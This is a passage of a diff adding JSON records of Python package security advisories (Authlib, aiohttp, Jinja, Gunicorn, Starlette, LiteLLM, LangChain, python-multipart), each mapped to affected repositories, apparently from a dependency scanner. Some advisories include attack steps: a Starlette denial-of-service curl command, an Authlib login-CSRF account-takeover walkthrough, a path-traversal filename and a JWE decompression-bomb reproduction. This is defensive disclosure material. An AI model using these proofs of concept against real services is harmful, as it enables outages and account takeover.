f\"_state_{self.name}_{state}\"\n        if self.cache:\n            value = self._get_cache_data(key)\n        else:\n            value = session.get(key)\n        if value:\n            return value.get(\"data\")\n        return None\n```\n\n*authlib/integrations/base_client/framework_integration.py:12-41*\n\nRetrieval in `authorize_access_token` therefore succeeds for whichever browser presents that opaque value, and the token exchange proceeds with the attacker's authorization code. [3]\n\n```py\n    def authorize_access_token(self, **kwargs):\n        \"\"\"Fetch access token in one step.\n\n        :return: A token dict.\n        \"\"\"\n        params = request.args.to_dict(flat=True)\n        state = params.get(\"oauth_token\")\n        if not state:\n            raise OAuthError(description='Missing \"oauth_token\" parameter')\n\n        data = self.framework.get_state_data(session, state)\n        if not data:\n            raise OAuthError(description='Missing \"request_token\" in temporary data')\n\n        params[\"request_token\"] = data[\"request_token\"]\n        params.update(kwargs)\n        self.framework.clear_state_data(session, state)\n        token = self.fetch_access_token(**params)\n        self.token = token\n        return token\n```\n\n*authlib/integrations/flask_client/apps.py:57-76*\n\nThis opens up an avenue for Login CSRF in applications that use cache-backed storage. Depending on the dependent application's implementation (e.g., whether it links accounts in the event of a login CSRF), this could lead to account takeover.\n\n## Proof of Concept\n\nConsider a hypothetical application — AwesomeAuthlibApp. Assume that AwesomeAuthlibApp contains internal logic such that, when an already authenticated user performs a `callback` request, the application links the newly provided SSO identity to the existing user account associated with that request.\n\nUnder these conditions, an attacker can achieve account takeover within the application by performing the following actions:\n\n1. The attacker initiates an SSO OAuth flow but halts the process immediately before the callback request is made to AwesomeAuthlibApp.\n2. The attacker then induces a logged-in user (via phishing, a drive-by attack, or similar means) to perform a GET request containing the attacker's state value and authorization code to the AwesomeAuthlibApp callback endpoint. Because Authlib does not verify whether the state token is bound to the session performing the callback, the callback is processed, the authorization code is sent to the provider, and the account linking proceeds.\n\nOnce the GET request is executed, the attacker's SSO account becomes permanently linked to the victim's AwesomeAuthlibApp account.\n\n## Suggested Fix\n\nPer the OAuth RFC [4], the state parameter should be tied to the user's session to prevent exactly such scenarios. One straightforward method of mitigating this issue is to continue storing the state in the session even when caching is enabled.\n\nAn alternative approach would be to hash the session ID (or another per-user secret derived from the session) into the cache key. This ensures the state remains stored in the cache while still being bound to the session of the user that initiated the OAuth flow.\n\n## Resources\n\n- [1] [flask_client/apps.py#L35](https://github.com/authlib/authlib/blob/260d04edee23d8470057ea659c16fb8a2c7b0dc2/authlib/integrations/flask_client/apps.py#L35)\n- [2] [base_client/framework_integration.py#L33](https://github.com/authlib/authlib/blob/260d04edee23d8470057ea659c16fb8a2c7b0dc2/authlib/integrations/base_client/framework_integration.py#L33)\n- [3] [flask_client/apps.py#L57](https://github.com/authlib/authlib/blob/260d04edee23d8470057ea659c16fb8a2c7b0dc2/authlib/integrations/flask_client/apps.py#L57)\n- [4] [RFC 6749 §10.12](https://www.rfc-editor.org/rfc/rfc6749#section-10.12)",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:17.433137Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "authlib"
+        ],
+        "affected_ranges": [
+          "0..1.6.6",
+          "1.0.0..∞"
+        ],
+        "references": [
+          "https://github.com/authlib/authlib/security/advisories/GHSA-fg6f-75jq-6523",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-68158",
+          "https://github.com/authlib/authlib/commit/2808378611dd6fb2532b189a9087877d8f0c0489",
+          "https://github.com/authlib/authlib/commit/7974f45e4d7492ab5f527577677f2770ce423228",
+          "https://github.com/authlib/authlib",
+          "https://pypi.org/project/authlib",
+          "https://github.com/advisories/GHSA-fg6f-75jq-6523"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'authlib' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1105",
+        "source": "osv",
+        "title": "AIOHTTP Vulnerable to Cookie Parser Warning Storm",
+        "summary": "### Summary\nReading multiple invalid cookies can lead to a logging storm.\n\n### Impact\nIf the ``cookies`` attribute is accessed in an application, then an attacker may be able to trigger a storm of warning-level logs using a specially crafted Cookie header.\n\n----\n\nPatch: https://github.com/aio-libs/aiohttp/commit/64629a0834f94e46d9881f4e99c41a137e1f3326",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:16.575751Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "aiohttp"
+        ],
+        "affected_ranges": [
+          "0..3.13.3",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-fh55-r93g-j68g",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-69230",
+          "https://github.com/aio-libs/aiohttp/commit/64629a0834f94e46d9881f4e99c41a137e1f3326",
+          "https://github.com/aio-libs/aiohttp",
+          "https://pypi.org/project/aiohttp",
+          "https://github.com/advisories/GHSA-fh55-r93g-j68g"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'aiohttp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1473",
+        "source": "osv",
+        "title": "Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter",
+        "summary": "The `xmlattr` filter in affected versions of Jinja accepts keys containing spaces. XML/HTML attributes cannot contain spaces, as each would then be interpreted as a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. Note that accepting keys as user input is not common or a particularly intended use case of the `xmlattr` filter, and an application doing so should already be verifying what keys are provided regardless of this fix.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T11:45:29.949639Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "jinja2"
+        ],
+        "affected_ranges": [
+          "0..3.1.3",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/pallets/jinja/security/advisories/GHSA-h5c8-rqwp-cp95",
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-22195",
+          "https://github.com/pallets/jinja/commit/716795349a41d4983a9a4771f7d883c96ea17be7",
+          "https://github.com/pallets/jinja",
+          "https://github.com/pallets/jinja/releases/tag/3.1.3",
+          "https://lists.debian.org/debian-lts-announce/2024/01/msg00010.html",
+          "https://lists.debian.org/debian-lts-announce/2024/12/msg00009.html",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5XCWZD464AJJJUBOO7CMPXQ4ROBC6JX2",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DELCVUUYX75I5K4Q5WMJG4MUZJA6VAIP",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/O7YWRBX6JQCWC2XXCTZ55C7DPMGICCN3",
+          "https://pypi.org/project/jinja2",
+          "https://github.com/advisories/GHSA-h5c8-rqwp-cp95"
+        ]
+      },
+      "repo": "tiangolo/fastapi",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'jinja2' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1109",
+        "source": "osv",
+        "title": "AIOHTTP has unicode match groups in regexes for ASCII protocol elements",
+        "summary": "### Summary\n\nThe parser allows non-ASCII decimals to be present in the Range header.\n\n### Impact\n\nThere is no known impact, but there is the possibility that there's a method to exploit a request smuggling vulnerability.\n\n----\n\nPatch: https://github.com/aio-libs/aiohttp/commit/c7b7a044f88c71cefda95ec75cdcfaa4792b3b96",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:15.425479Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "aiohttp"
+        ],
+        "affected_ranges": [
+          "0..3.13.3",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-mqqc-3gqh-h2x8",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-69225",
+          "https://github.com/aio-libs/aiohttp/commit/c7b7a044f88c71cefda95ec75cdcfaa4792b3b96",
+          "https://github.com/aio-libs/aiohttp",
+          "https://pypi.org/project/aiohttp",
+          "https://github.com/advisories/GHSA-mqqc-3gqh-h2x8"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'aiohttp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1433",
+        "source": "osv",
+        "title": "Gunicorn HTTP Request/Response Smuggling vulnerability",
+        "summary": "Gunicorn version 21.2.0 does not properly validate the value of the 'Transfer-Encoding' header as specified in the RFC standards, which leads to the default fallback method of 'Content-Length,' making it vulnerable to TE.CL request smuggling. This vulnerability can lead to cache poisoning, data exposure, session manipulation, SSRF, XSS, DoS, data integrity compromise, security bypass, information leakage, and business logic abuse.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:55.125128Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "gunicorn"
+        ],
+        "affected_ranges": [
+          "0..22.0.0",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-6827",
+          "https://github.com/benoitc/gunicorn/issues/3087",
+          "https://github.com/benoitc/gunicorn/issues/3278",
+          "https://github.com/benoitc/gunicorn/pull/3113",
+          "https://github.com/benoitc/gunicorn",
+          "https://github.com/benoitc/gunicorn/releases/tag/22.0.0",
+          "https://huntr.com/bounties/1b4f8f38-39da-44b6-9f98-f618639d0dd7",
+          "https://pypi.org/project/gunicorn",
+          "https://github.com/advisories/GHSA-hc5x-x2vx-497g"
+        ]
+      },
+      "repo": "ianlintner/python_dsa",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'gunicorn' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1097",
+        "source": "osv",
+        "title": "AIOHTTP vulnerable to brute-force leak of internal static ﬁle path components",
+        "summary": "### Summary\nPath normalization for static files prevents path traversal, but opens up the ability for an attacker to ascertain the\nexistence of absolute path components.\n\n### Impact\nIf an application uses `web.static()` (not recommended for production deployments), it may be possible for an attacker to ascertain the existence of path components.\n\n------\n\nPatch: https://github.com/aio-libs/aiohttp/commit/f2a86fd5ac0383000d1715afddfa704413f0711e",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:15.611250Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "aiohttp"
+        ],
+        "affected_ranges": [
+          "0..3.13.3",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-54jq-c3m8-4m76",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-69226",
+          "https://github.com/aio-libs/aiohttp/commit/f2a86fd5ac0383000d1715afddfa704413f0711e",
+          "https://github.com/aio-libs/aiohttp",
+          "https://pypi.org/project/aiohttp",
+          "https://github.com/advisories/GHSA-54jq-c3m8-4m76"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'aiohttp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1943",
+        "source": "osv",
+        "title": "Starlette Denial of service (DoS) via multipart/form-data",
+        "summary": "### Summary\nStarlette treats `multipart/form-data` parts without a `filename` as text form fields and buffers those in byte strings with no size limit. This allows an attacker to upload arbitrary large form fields and cause Starlette to both slow down significantly due to excessive memory allocations and copy operations, and also consume more and more memory until the server starts swapping and grinds to a halt, or the OS terminates the server process with an OOM error. Uploading multiple such requests in parallel may be enough to render a service practically unusable, even if reasonable request size limits are enforced by a reverse proxy in front of Starlette.\n\n### PoC\n\n```python\nfrom starlette.applications import Starlette\nfrom starlette.routing import Route\n\nasync def poc(request):\n    async with request.form():\n        pass\n\napp = Starlette(routes=[\n    Route('/', poc, methods=[\"POST\"]),\n])\n```\n\n```sh\ncurl http://localhost:8000 -F 'big=</dev/urandom'\n```\n\n### Impact\nThis Denial of service (DoS) vulnerability affects all applications built with Starlette (or FastAPI) accepting form requests.\n",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:43.184287Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "starlette"
+        ],
+        "affected_ranges": [
+          "0..0.40.0",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/encode/starlette/security/advisories/GHSA-f96h-pmfr-66vw",
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-47874",
+          "https://github.com/encode/starlette/commit/fd038f3070c302bff17ef7d173dbb0b007617733",
+          "https://github.com/encode/starlette",
+          "https://pypi.org/project/starlette",
+          "https://github.com/advisories/GHSA-f96h-pmfr-66vw"
+        ]
+      },
+      "repo": "tiangolo/fastapi",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'starlette' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1550",
+        "source": "osv",
+        "title": "SQL injection in litellm",
+        "summary": "An SQL Injection vulnerability exists in the berriai/litellm repository, specifically within the `/global/spend/logs` endpoint. The vulnerability arises due to improper neutralization of special elements used in an SQL command. The affected code constructs an SQL query by concatenating an unvalidated `api_key` parameter directly into the query, making it susceptible to SQL Injection if the `api_key` contains malicious data. This issue affects the latest version of the repository. Successful exploitation of this vulnerability could lead to unauthorized access, data manipulation, exposure of confidential information, and denial of service (DoS).",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:34.436601Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "litellm"
+        ],
+        "affected_ranges": [
+          "0..1.40.0",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-5225",
+          "https://github.com/BerriAI/litellm/pull/3940",
+          "https://github.com/BerriAI/litellm/commit/f75c15d6cd535aa78014378ad532de1df6be2f56",
+          "https://github.com/BerriAI/litellm",
+          "https://huntr.com/bounties/491e4884-0306-4cd4-8fe2-9a19de33bf5c",
+          "https://pypi.org/project/litellm",
+          "https://github.com/advisories/GHSA-h6m6-jj8v-94jj"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'litellm' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1852",
+        "source": "osv",
+        "title": "Python-Multipart has Arbitrary File Write via Non-Default Configuration",
+        "summary": "### Summary\n\nA Path Traversal vulnerability exists when using non-default configuration options `UPLOAD_DIR` and `UPLOAD_KEEP_FILENAME=True`. An attacker can write uploaded files to arbitrary locations on the filesystem by crafting a malicious filename.\n\n### Details\n\nWhen `UPLOAD_DIR` is set and `UPLOAD_KEEP_FILENAME` is `True`, the library constructs the file path using `os.path.join(file_dir, fname)`. Due to the behavior of `os.path.join()`, if the filename begins with a `/`, all preceding path components are discarded:\n\n```py\nos.path.join(\"/upload/dir\", \"/etc/malicious\") == \"/etc/malicious\"\n```\n                        \nThis allows an attacker to bypass the intended upload directory and write files to arbitrary paths.                                         \n                                                                                                                                              \n#### Affected Configuration                                                                                                                      \n                                                                                                                                              \nProjects are only affected if all of the following are true:                                                                                     \n- `UPLOAD_DIR` is set\n- `UPLOAD_KEEP_FILENAME` is set to True\n- The uploaded file exceeds `MAX_MEMORY_FILE_SIZE` (triggering a flush to disk)\n\nThe default configuration is not vulnerable.                                                                                                \n                                                                                                                                              \n#### Impact                                                                                                                                   \n                                                                                                                                              \nArbitrary file write to attacker-controlled paths on the filesystem.                                                                        \n                                                                                                                                              \n#### Mitigation                                                                                                                                  \n                                                                                                                                              \nUpgrade to version 0.0.22, or avoid using `UPLOAD_KEEP_FILENAME=True` in project configurations.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:20.509610Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "python-multipart"
+        ],
+        "affected_ranges": [
+          "0..0.0.22",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/Kludex/python-multipart/security/advisories/GHSA-wp53-j4wj-2cfg",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-24486",
+          "https://github.com/Kludex/python-multipart/commit/9433f4bbc9652bdde82bbe380984e32f8cfc89c4",
+          "https://github.com/Kludex/python-multipart",
+          "https://github.com/Kludex/python-multipart/releases/tag/0.0.22",
+          "https://pypi.org/project/python-multipart",
+          "https://github.com/advisories/GHSA-wp53-j4wj-2cfg"
+        ]
+      },
+      "repo": "ianlintner/audio_engineer",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'python-multipart' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1852",
+        "source": "osv",
+        "title": "Python-Multipart has Arbitrary File Write via Non-Default Configuration",
+        "summary": "### Summary\n\nA Path Traversal vulnerability exists when using non-default configuration options `UPLOAD_DIR` and `UPLOAD_KEEP_FILENAME=True`. An attacker can write uploaded files to arbitrary locations on the filesystem by crafting a malicious filename.\n\n### Details\n\nWhen `UPLOAD_DIR` is set and `UPLOAD_KEEP_FILENAME` is `True`, the library constructs the file path using `os.path.join(file_dir, fname)`. Due to the behavior of `os.path.join()`, if the filename begins with a `/`, all preceding path components are discarded:\n\n```py\nos.path.join(\"/upload/dir\", \"/etc/malicious\") == \"/etc/malicious\"\n```\n                        \nThis allows an attacker to bypass the intended upload directory and write files to arbitrary paths.                                         \n                                                                                                                                              \n#### Affected Configuration                                                                                                                      \n                                                                                                                                              \nProjects are only affected if all of the following are true:                                                                                     \n- `UPLOAD_DIR` is set\n- `UPLOAD_KEEP_FILENAME` is set to True\n- The uploaded file exceeds `MAX_MEMORY_FILE_SIZE` (triggering a flush to disk)\n\nThe default configuration is not vulnerable.                                                                                                \n                                                                                                                                              \n#### Impact                                                                                                                                   \n                                                                                                                                              \nArbitrary file write to attacker-controlled paths on the filesystem.                                                                        \n                                                                                                                                              \n#### Mitigation                                                                                                                                  \n                                                                                                                                              \nUpgrade to version 0.0.22, or avoid using `UPLOAD_KEEP_FILENAME=True` in project configurations.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:20.509610Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "python-multipart"
+        ],
+        "affected_ranges": [
+          "0..0.0.22",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/Kludex/python-multipart/security/advisories/GHSA-wp53-j4wj-2cfg",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-24486",
+          "https://github.com/Kludex/python-multipart/commit/9433f4bbc9652bdde82bbe380984e32f8cfc89c4",
+          "https://github.com/Kludex/python-multipart",
+          "https://github.com/Kludex/python-multipart/releases/tag/0.0.22",
+          "https://pypi.org/project/python-multipart",
+          "https://github.com/advisories/GHSA-wp53-j4wj-2cfg"
+        ]
+      },
+      "repo": "tiangolo/fastapi",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'python-multipart' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1507",
+        "source": "osv",
+        "title": "Langchain SQL Injection vulnerability",
+        "summary": "A vulnerability in the GraphCypherQAChain class of langchain-ai/langchain version 0.2.5 allows for SQL injection through prompt injection. This vulnerability can lead to unauthorized data manipulation, data exfiltration, denial of service (DoS) by deleting all data, breaches in multi-tenant security environments, and data integrity issues. Attackers can create, update, or delete nodes and relationships without proper authorization, extract sensitive data, disrupt services, access data across different tenants, and compromise the integrity of the database.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:43.617965Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "langchain"
+        ],
+        "affected_ranges": [
+          "0..0.2.0",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-8309",
+          "https://github.com/langchain-ai/langchain/commit/64c317eba05fbac0c6a6fc5aa192bc0d7130972e",
+          "https://github.com/langchain-ai/langchain/commit/c2a3021bb0c5f54649d380b42a0684ca5778c255",
+          "https://github.com/langchain-ai/langchain",
+          "https://github.com/pypa/advisory-database/tree/main/vulns/langchain/PYSEC-2024-115.yaml",
+          "https://huntr.com/bounties/8f4ad910-7fdc-4089-8f0a-b5df5f32e7c5",
+          "https://pypi.org/project/langchain",
+          "https://github.com/advisories/GHSA-45pg-36p6-83v9"
+        ]
+      },
+      "repo": "ianlintner/audio_engineer",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'langchain' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1546",
+        "source": "osv",
+        "title": "LiteLLM Has an Improper Authorization Vulnerability",
+        "summary": "An improper authorization vulnerability exists in the main-latest version of BerriAI/litellm. When a user with the role 'internal_user_viewer' logs into the application, they are provided with an overly privileged API key. This key can be used to access all the admin functionality of the application, including endpoints such as '/users/list' and '/users/get_users'. This vulnerability allows for privilege escalation within the application, enabling any account to become a PROXY ADMIN.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:58.397880Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "litellm"
+        ],
+        "affected_ranges": [
+          "0..1.61.15",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-0628",
+          "https://github.com/berriai/litellm/commit/566d9354aab4215091b2e51ad0333e948125fa1b",
+          "https://github.com/BerriAI/litellm",
+          "https://huntr.com/bounties/6c0e2f75-2d03-42f9-9530-e16a973317fc",
+          "https://pypi.org/project/litellm",
+          "https://github.com/advisories/GHSA-fjcf-3j3r-78rp"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'litellm' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1510",
+        "source": "osv",
+        "title": "langchain vulnerable to path traversal",
+        "summary": "langchain-ai/langchain is vulnerable to path traversal due to improper limitation of a pathname to a restricted directory ('Path Traversal') in its LocalFileStore functionality. An attacker can leverage this vulnerability to read or write files anywhere on the filesystem, potentially leading to information disclosure or remote code execution. The issue lies in the handling of file paths in the mset and mget methods, where user-supplied input is not adequately sanitized, allowing directory traversal sequences to reach unintended directories.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T11:45:39.448710Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "langchain"
+        ],
+        "affected_ranges": [
+          "0..0.0.353",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-3571",
+          "https://github.com/langchain-ai/langchain/commit/aad3d8bd47d7f5598156ff2bdcc8f736f24a7412",
+          "https://github.com/langchain-ai/langchain",
+          "https://huntr.com/bounties/2df3acdc-ee4f-4257-bbf8-a7de3870a9d8",
+          "https://pypi.org/project/langchain",
+          "https://github.com/advisories/GHSA-rgp8-pm28-3759"
+        ]
+      },
+      "repo": "ianlintner/audio_engineer",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'langchain' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1202",
+        "source": "osv",
+        "title": "Authlib : JWE zip=DEF decompression bomb enables DoS",
+        "summary": "### Summary\n_Authlib’s JWE `zip=DEF` path performs unbounded DEFLATE decompression. A very small ciphertext can expand into tens or hundreds of megabytes on decrypt, allowing an attacker who can supply decryptable tokens to exhaust memory and CPU and cause denial of service._\n\n### Details\n- Affected component: Authlib JOSE, JWE `zip=DEF` (DEFLATE) support.\n- In `authlib/authlib/jose/rfc7518/jwe_zips.py`, `DeflateZipAlgorithm.decompress` calls `zlib.decompress(s, -zlib.MAX_WBITS)` without a maximum output limit. This permits unbounded expansion of compressed payloads.\n- In the JWE decode flow (`authlib/authlib/jose/rfc7516/jwe.py`), when the protected header contains `\"zip\": \"DEF\"`, the library routes the decrypted ciphertext into the `decompress` method and assigns the fully decompressed bytes to the plaintext field before returning it. No streaming limit or quota is applied.\n- Because DEFLATE achieves extremely high ratios on highly repetitive input, an attacker can craft a tiny `zip=DEF` ciphertext that inflates to a very large plaintext during decrypt, spiking RSS and CPU. Repeated requests can starve the process or host.\n\nCode references (from this repository version):\n- `authlib/authlib/jose/rfc7518/jwe_zips.py` – `DeflateZipAlgorithm.decompress` uses unbounded `zlib.decompress`.\n- `authlib/authlib/jose/rfc7516/jwe.py` – JWE decode path applies `zip_.decompress(msg)` when `zip=DEF` is present in the header.\n\nContrast: The `joserfc` project guards `zip=DEF` decompression with a fixed maximum (256 KB) and raises `ExceededSizeError` if output would exceed this limit, preventing the bomb. Authlib lacks such a guard in this codebase snapshot.\n\n### PoC\nEnvironment: Python 3.10+ inside a venv; Authlib installed editable from this repository so source changes are visible. The PoC script demonstrates both a benign and a compressible-bomb payload and prints wall/CPU time, RSS, and size ratios.\n\n1) Create venv and install Authlib (editable):\nSet current directory to /authlib\nDownload [jwe_deflate_dos_demo.py](https://github.com/user-attachments/files/22519553/jwe_deflate_dos_demo.py) in /authlib\n```\npython3 -m venv .venv\n.venv/bin/pip install --upgrade pip\n.venv/bin/pip install -e .\n```\n\n2) Run the PoC (included in this repo):\n```\n.venv/bin/python /authlib/jwe_deflate_dos_demo.py --size 50 --max-rss-mb 2048\n```\n\nSample output (abridged):\n```\nLOCAL TEST ONLY – do not send to third-party systems.\nRuntime: Python 3.13.6 / Authlib 1.6.4 / zip=DEF via A256GCM\n[CASE] normal    plaintext=13B  ciphertext=117B decompressed=13B  wall_s=0.000 cpu_s=0.000 peak_rss_mb=31.0  ratio=0.1\n[CASE] malicious plaintext=50MB ciphertext=~4KB decompressed=50MB wall_s=~2.3  cpu_s=~2.2  peak_rss_mb=800+  ratio=12500+\n```\n\nThe second case shows the decompression spike: a few KB of ciphertext forces allocation and processing of ~50 MB during decrypt. Repeated requests can quickly exhaust available memory and CPU.\n\nReproduction notes:\n- Algorithm: `alg=dir`, `enc=A256GCM`, header includes `{ \"zip\": \"DEF\" }`.\n- The PoC uses a 32‑byte local symmetric key and a highly compressible payload (`\"A\" * N`).\n- Increase `--size` to stress memory; the `--max-rss-mb` flag helps avoid destabilizing the host during testing.\n\n### Impact\n- Effect: Denial of service (memory/CPU exhaustion) during JWE decrypt of `zip=DEF` tokens.\n- Who is impacted: Any service that uses Authlib to decrypt JWE tokens with `zip=DEF` and where an attacker can submit tokens that will be successfully decrypted (e.g., shared `dir` key, token reflection, or compromised/abused issuers).\n- Confidentiality/Integrity: No direct C/I impact; availability impact is high.\n\n### Severity (CVSS v3.1)\nBase vector (typical shared‑secret scenario where the attacker must produce a decryptable token):\n- `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H` → 6.5 (MEDIUM)\n\n**Rationale:**\n- Network‑reachable (AV:N), low complexity (AC:L), no user interaction (UI:N), scope unchanged (S:U).\n- Attacker must hold or gain ability to mint a decryptable token for the target (PR:L) — common with `alg=dir` and shared keys across services.\n- No confidentiality or integrity loss (C:N/I:N); availability is severely impacted (A:H) due to decompression expansion.\nIf arbitrary unprivileged parties can submit JWEs that will be decrypted (PR:N), the base vector becomes:\n- `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` → 7.5 (HIGH)\n\n### Mitigations / Workarounds\n- Reject or strip `zip=DEF` for inbound JWEs at the application boundary until a fix is available.\n- Fork and add a bounded decompression guard (e.g., `zlib.decompress(..., max_length)` via `decompressobj().decompress(data, MAX_SIZE)`), returning an error when output exceeds a safe limit.\n- Enforce strict maximum token sizes and fail fast on oversized inputs; combine with rate limiting.\n\n### Remediation Guidance (for maintainers)\n- Mirror `joserfc`’s approach: add a conservative maximum output size (e.g., 256 KB by default) and raise a specific error when exceeded; document a controlled way to raise this ceiling for trusted environments.\n- Consider streaming decode with chunked limits to avoid large single allocations.\n\n### References\n- Authlib source: `authlib/authlib/jose/rfc7518/jwe_zips.py`, `authlib/authlib/jose/rfc7516/jwe.py`",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:07.522275Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "authlib"
+        ],
+        "affected_ranges": [
+          "0..1.6.5",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/authlib/authlib/security/advisories/GHSA-g7f3-828f-7h7m",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-62706",
+          "https://github.com/authlib/authlib/commit/e0863d5129316b1790eee5f14cece32a03b8184d",
+          "https://github.com/authlib/authlib",
+          "https://lists.debian.org/debian-lts-announce/2025/10/msg00032.html",
+          "https://pypi.org/project/authlib",
+          "https://github.com/advisories/GHSA-g7f3-828f-7h7m"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'authlib' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1203",
+        "source": "osv",
+        "title": "Authlib is vulnerable to Denial of Service via Oversized JOSE Segments",
